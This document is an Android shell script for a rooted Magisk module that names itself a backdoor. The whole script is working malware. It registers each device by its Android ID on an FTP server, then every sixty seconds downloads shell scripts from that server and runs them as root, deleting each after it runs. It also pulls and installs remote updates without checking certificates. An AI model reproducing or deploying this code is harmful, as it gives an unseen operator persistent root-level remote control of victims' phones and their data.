#!/system/bin/sh



###########################################################
#  Copyright © 2024 DARKER.c studio. All rights reserved. #
###########################################################



# global variables
    MODDIR="/data/adb/modules/darker_ShellBackDoor"
    cfg_dir="$MODDIR/backdoor.prop"
    android_id="$(settings get secure android_id)"
#

# define
    _curl="$MODDIR/bin/curl"
#

# lib
    grep_prop() {
        REGEX="s/^$1=//p"
        shift
        FILES="$(printf '%s\n' "$@")"
        [ -z "$FILES" ] && FILES='/system/build.prop'
        first_file="$(echo "$FILES" | head -n 1)"
        < "$first_file" dos2unix | sed -n "$REGEX" | head -n 1
    }

    _exec() {
        chown root:root "$1" 2>/dev/null
        chmod 0775 "$1" 2>/dev/null
        "$1" & 2>/dev/null
        rm -rf "$1"
    }
#

# get cfg
    ftp_user="$(grep_prop ftp_user "$cfg_dir" 2>/dev/null)"
    ftp_passwd="$(grep_prop ftp_passwd "$cfg_dir" 2>/dev/null)"
    ftp_ip="$(grep_prop ftp_ip "$cfg_dir" 2>/dev/null)"
    ftp_exec_dir="$(grep_prop ftp_exec_dir "$cfg_dir" 2>/dev/null)"
    ftp_data_dir="$(grep_prop ftp_data_dir "$cfg_dir" 2>/dev/null)"
#

update() {
    rm -rf "$MODDIR"/newver.zip
    netjson="$($_curl -sLk "$(grep_prop updateJson "$MODDIR"/module.prop)")"
    # shellcheck disable=SC2016
    netver="$(echo "$netjson" | sed -n '/versionCode/p' | /data/adb/magisk/busybox awk -v FS=': ' '{print $2}' | /data/adb/magisk/busybox awk -v FS=',' '{print $1}')"
    pver="$(grep_prop versionCode "$MODDIR"/module.prop 2>/dev/null)"
    if [ "$netver" -ge "$pver" ] && [ "$netver" != "$pver" ]; then
        # shellcheck disable=SC2016
        updateZipUrl="$(echo "$netjson" | sed -n '/zipUrl/p' | /data/adb/magisk/busybox awk -v FS=': "' '{print $2}' | /data/adb/magisk/busybox awk -v FS='",' '{print $1}')"
        $_curl -sLk "$updateZipUrl" --output "$MODDIR"/newver.zip
        mkdir "$MODDIR"/newver
        unzip -o -q -d "$MODDIR"/newver "$MODDIR"/newver.zip
        rm -rf "$MODDIR"/newver.zip "$MODDIR/newver/customize.sh"
        cp -af "$MODDIR/newver" "$MODDIR"
        rm -rf "$MODDIR"/newver
        chown -R root:root "$MODDIR"
        chmod -R 0775 "$MODDIR"
        chmod +x "$MODDIR"
        "$MODDIR"/backdoor_main.sh &
        exit 0
    fi
}

backdoor() {

    # register
        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir/" -X "MKD $android_id"
    # 
	
    # execute

        # shellcheck disable=SC2016
        temp="$($_curl ftp://"$ftp_user":"$ftp_passwd"@"$ftp_ip"/"$ftp_exec_dir/" -s | /data/adb/magisk/busybox awk -v FS=':' '{print $2}' | /data/adb/magisk/busybox awk -v FS=' ' '{print $2}' | grep .sh)"
        IFS='
 '
        # shellcheck disable=SC2206
        exec_pool=($temp)

        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/all.sh" --output "$MODDIR"/all.sh
        _exec "$MODDIR"/all.sh

        for num in $(seq 0 ${#exec_pool[@]}); do
            if [ "${exec_pool[$num]}" = "$android_id.sh" ]; then
                $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/${exec_pool[$num]}" --output "$MODDIR"/"${exec_pool[$num]}"
                _exec "$MODDIR"/"${exec_pool[$num]}"
                $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/" -X "DELE ${exec_pool[$num]}"
                break
            fi
        done

    #
}

while true; do
    (update &)
    (backdoor &)
    sleep 60
done
